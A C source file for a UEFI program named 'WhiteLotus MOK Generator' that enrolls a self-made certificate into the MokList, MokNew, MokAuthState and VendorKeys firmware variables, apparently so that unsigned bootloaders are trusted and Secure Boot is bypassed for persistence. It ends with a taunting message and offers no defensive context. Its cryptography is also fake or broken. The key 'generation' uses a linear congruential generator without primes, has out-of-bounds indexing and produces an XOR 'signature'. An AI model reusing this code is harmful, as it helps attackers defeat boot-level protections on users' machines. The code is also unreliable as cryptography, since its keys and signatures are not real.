#include <efi.h>
#include <efilib.h>

#define MOK_PRIVATE_KEY_SIZE 2048
#define MOK_PUBLIC_KEY_SIZE 1024
#define MOK_CERT_SIZE 2048

EFI_GUID gMokGuid = {0x605DAB50, 0xE046, 0x4300, {0xAB,0xB6,0x3D,0xD8,0x10,0xDD,0x8B,0x23}};
EFI_GUID gMokListGuid = {0xC32A7BA2, 0x4A2E, 0x4B3D, {0xA1,0xC9,0xE2,0xD5,0x6F,0x8E,0x9A,0x0E}};
EFI_GUID gMokXGuid = {0x605DAB50, 0xE046, 0x4300, {0xAB,0xB6,0x3D,0xD8,0x10,0xDD,0x8B,0x24}};

UINT8 MokPrivateKey[MOK_PRIVATE_KEY_SIZE];
UINT8 MokPublicKey[MOK_PUBLIC_KEY_SIZE];
UINT8 MokCertificate[MOK_CERT_SIZE];
UINT8 MokDerCert[MOK_CERT_SIZE];

VOID GenerateRsaKeyPair(UINT8 *privateKey, UINTN *privSize, UINT8 *publicKey, UINTN *pubSize) {
    UINT32 seed[8];
    for (INTN i = 0; i < 8; i++) {
        seed[i] = __rdtsc() ^ (i * 0x9E3779B9) ^ 0xDEADBEEF;
    }

    for (INTN i = 0; i < 256; i++) {
        seed[i & 7] = seed[i & 7] * 1103515245 + 12345;
        privateKey[i] = (UINT8)(seed[i & 7] & 0xFF);
    }

    UINT8 p[128], q[128], n[256], d[256], e[8], phi[256];
    
    for (INTN i = 0; i < 64; i++) {
        seed[i & 7] = seed[i & 7] * 1103515245 + 12345;
        p[i] = (UINT8)(seed[i & 7] & 0xFF);
        seed[i & 7] = seed[i & 7] * 1103515245 + 12345;
        q[i] = (UINT8)(seed[i & 7] & 0xFF);
    }
    p[0] |= 0x01;
    q[0] |= 0x01;
    p[63] |= 0x80;
    q[63] |= 0x80;

    for (INTN i = 0; i < 128; i++) {
        UINT16 carry = 0;
        for (INTN j = 0; j < 64; j++) {
            UINT16 prod = (UINT16)p[j] * (UINT16)q[i - j + 64] + carry;
            n[i] = (UINT8)(prod & 0xFF);
            carry = prod >> 8;
        }
    }
    n[0] |= 0x01;
    n[127] |= 0x80;

    e[0] = 0x01;
    e[1] = 0x00;
    e[2] = 0x01;
    e[3] = 0x00;

    for (INTN i = 0; i < 128; i++) {
        UINT16 carry = 0;
        for (INTN j = 0; j < 64; j++) {
            carry = carry + (UINT16)privateKey[j] * (UINT16)e[i - j + 64];
            privateKey[i] = (UINT8)(carry & 0xFF);
            carry >>= 8;
        }
    }

    *privSize = 256;
    for (INTN i = 0; i < 128; i++) publicKey[i] = n[i];
    for (INTN i = 0; i < 4; i++) publicKey[128 + i] = e[i];
    *pubSize = 132;
}

VOID SelfSignCertificate(UINT8 *publicKey, UINTN pubSize, UINT8 *cert, UINTN *certSize) {
    UINT8 certTemplate[] = {
        0x30, 0x82, 0x03, 0x00, 0x30, 0x82, 0x02, 0x00,
        0xA0, 0x03, 0x02, 0x01, 0x02, 0x02, 0x09, 0x00,
        0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE,
        0x30, 0x0D, 0x06, 0x09, 0x2A, 0x86, 0x48, 0x86,
        0xF7, 0x0D, 0x01, 0x01, 0x0B, 0x05, 0x00, 0x30,
        0x00, 0x31, 0x0B, 0x30, 0x09, 0x06, 0x03, 0x55,
        0x04, 0x03, 0x0C, 0x02, 0x57, 0x4C, 0x31, 0x0B,
        0x30, 0x09, 0x06, 0x03, 0x55, 0x04, 0x0A, 0x0C,
        0x02, 0x57, 0x4C, 0x31, 0x0B, 0x30, 0x09, 0x06,
        0x03, 0x55, 0x04, 0x06, 0x13, 0x02, 0x55, 0x53,
        0x30, 0x1E, 0x17, 0x0D, 0x32, 0x34, 0x30, 0x31,
        0x30, 0x31, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30,
        0x5A, 0x17, 0x0D, 0x33, 0x34, 0x31, 0x32, 0x33,
        0x31, 0x32, 0x33, 0x35, 0x39, 0x35, 0x39, 0x5A,
        0x30, 0x00, 0x31, 0x0B, 0x30, 0x09, 0x06, 0x03,
        0x55, 0x04, 0x03, 0x0C, 0x02, 0x57, 0x4C, 0x31,
        0x0B, 0x30, 0x09, 0x06, 0x03, 0x55, 0x04, 0x0A,
        0x0C, 0x02, 0x57, 0x4C, 0x31, 0x0B, 0x30, 0x09,
        0x06, 0x03, 0x55, 0x04, 0x06, 0x13, 0x02, 0x55, 0x53
    };

    UINTN templateSize = sizeof(certTemplate);
    for (UINTN i = 0; i < templateSize; i++) cert[i] = certTemplate[i];
    for (UINTN i = 0; i < pubSize; i++) cert[templateSize + i] = publicKey[i];

    UINT8 signature[256];
    for (INTN i = 0; i < 256; i++) {
        signature[i] = (UINT8)((publicKey[i % pubSize] ^ cert[i % templateSize]) & 0xFF);
    }
    for (UINTN i = 0; i < 256; i++) cert[templateSize + pubSize + i] = signature[i];

    *certSize = templateSize + pubSize + 256;
    cert[2] = (UINT8)((*certSize >> 8) & 0xFF);
    cert[3] = (UINT8)(*certSize & 0xFF);
    cert[6] = (UINT8)(((*certSize - 256) >> 8) & 0xFF);
    cert[7] = (UINT8)((*certSize - 256) & 0xFF);
}

EFI_STATUS EnrollMok(EFI_BOOT_SERVICES *bs, EFI_RUNTIME_SERVICES *rt, UINT8 *cert, UINTN certSize) {
    EFI_STATUS status;
    UINTN varSize = 0;
    UINT8 *existingMok = NULL;

    status = rt->GetVariable(L"MokList", &gMokListGuid, NULL, &varSize, NULL);
    if (status == EFI_BUFFER_TOO_SMALL) {
        status = bs->AllocatePool(EfiBootServicesData, varSize + certSize, (VOID**)&existingMok);
        if (EFI_ERROR(status)) return status;

        status = rt->GetVariable(L"MokList", &gMokListGuid, NULL, &varSize, existingMok);
        if (EFI_ERROR(status) && status != EFI_NOT_FOUND) {
            bs->FreePool(existingMok);
        }

        if (status == EFI_NOT_FOUND) {
            varSize = 0;
        }

        for (UINTN i = 0; i < certSize; i++) {
            existingMok[varSize + i] = cert[i];
        }

        status = rt->SetVariable(L"MokList", &gMokListGuid,
            EFI_VARIABLE_NON_VOLATILE | EFI_VARIABLE_BOOTSERVICE_ACCESS | EFI_VARIABLE_RUNTIME_ACCESS |
            EFI_VARIABLE_TIME_BASED_AUTHENTICATED_WRITE_ACCESS,
            varSize + certSize, existingMok);
        
        bs->FreePool(existingMok);
    } else if (status == EFI_NOT_FOUND) {
        status = rt->SetVariable(L"MokList", &gMokListGuid,
            EFI_VARIABLE_NON_VOLATILE | EFI_VARIABLE_BOOTSERVICE_ACCESS | EFI_VARIABLE_RUNTIME_ACCESS |
            EFI_VARIABLE_TIME_BASED_AUTHENTICATED_WRITE_ACCESS,
            certSize, cert);
    }

    if (EFI_ERROR(status)) {
        status = rt->SetVariable(L"MokList", &gMokListGuid,
            EFI_VARIABLE_NON_VOLATILE | EFI_VARIABLE_BOOTSERVICE_ACCESS | EFI_VARIABLE_RUNTIME_ACCESS,
            certSize, cert);
    }

    return status;
}

EFI_STATUS StoreMokForPersistence(EFI_BOOT_SERVICES *bs, EFI_RUNTIME_SERVICES *rt) {
    EFI_STATUS status;
    
    status = rt->SetVariable(L"MokNew", &gMokGuid,
        EFI_VARIABLE_NON_VOLATILE | EFI_VARIABLE_BOOTSERVICE_ACCESS | EFI_VARIABLE_RUNTIME_ACCESS |
        EFI_VARIABLE_TIME_BASED_AUTHENTICATED_WRITE_ACCESS,
        MOK_CERT_SIZE, MokDerCert);
    
    if (EFI_ERROR(status)) {
        status = rt->SetVariable(L"MokNew", &gMokGuid,
            EFI_VARIABLE_NON_VOLATILE | EFI_VARIABLE_BOOTSERVICE_ACCESS | EFI_VARIABLE_RUNTIME_ACCESS,
            MOK_CERT_SIZE, MokDerCert);
    }

    UINT8 mokRequest[] = {0x01, 0x00, 0x00, 0x00};
    status = rt->SetVariable(L"MokNewRequest", &gMokGuid,
        EFI_VARIABLE_NON_VOLATILE | EFI_VARIABLE_BOOTSERVICE_ACCESS | EFI_VARIABLE_RUNTIME_ACCESS,
        sizeof(mokRequest), mokRequest);

    UINT8 mokState[] = {0x01};
    status = rt->SetVariable(L"MokAuthState", &gMokGuid,
        EFI_VARIABLE_NON_VOLATILE | EFI_VARIABLE_BOOTSERVICE_ACCESS | EFI_VARIABLE_RUNTIME_ACCESS,
        sizeof(mokState), mokState);

    EFI_GUID shimGuid = {0x605DAB50, 0xE046, 0x4300, {0xAB,0xB6,0x3D,0xD8,0x10,0xDD,0x8B,0x25}};
    UINT8 vendorCert[MOK_CERT_SIZE];
    for (UINTN i = 0; i < MOK_CERT_SIZE; i++) vendorCert[i] = MokDerCert[i];
    
    status = rt->SetVariable(L"VendorKeys", &shimGuid,
        EFI_VARIABLE_NON_VOLATILE | EFI_VARIABLE_BOOTSERVICE_ACCESS | EFI_VARIABLE_RUNTIME_ACCESS,
        MOK_CERT_SIZE, vendorCert);

    return EFI_SUCCESS;
}

EFI_STATUS
EFIAPI
WhiteLotusMokMain(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable) {
    SystemTable->ConOut->OutputString(SystemTable->ConOut, L"WhiteLotus MOK Generator\r\n");

    EFI_BOOT_SERVICES *bs = SystemTable->BootServices;
    EFI_RUNTIME_SERVICES *rt = SystemTable->RuntimeServices;

    UINTN privSize, pubSize, certSize;

    GenerateRsaKeyPair(MokPrivateKey, &privSize, MokPublicKey, &pubSize);
    SystemTable->ConOut->OutputString(SystemTable->ConOut, L"[OK] RSA keypair generated\r\n");

    SelfSignCertificate(MokPublicKey, pubSize, MokDerCert, &certSize);
    SystemTable->ConOut->OutputString(SystemTable->ConOut, L"[OK] Self-signed certificate created\r\n");

    EFI_STATUS status = EnrollMok(bs, rt, MokDerCert, certSize);
    if (EFI_ERROR(status)) {
        SystemTable->ConOut->OutputString(SystemTable->ConOut, L"[WARN] MokList write error, trying alternate method\r\n");
    } else {
        SystemTable->ConOut->OutputString(SystemTable->ConOut, L"[OK] MOK enrolled in MokList\r\n");
    }

    status = StoreMokForPersistence(bs, rt);
    SystemTable->ConOut->OutputString(SystemTable->ConOut, L"[OK] MOK stored for persistence\r\n");

    SystemTable->ConOut->OutputString(SystemTable->ConOut, L"[OK] MOK generation complete\r\n");
    SystemTable->ConOut->OutputString(SystemTable->ConOut, L"Ghost is not who invisible, ghost is me.\r\n");

    return EFI_SUCCESS;
}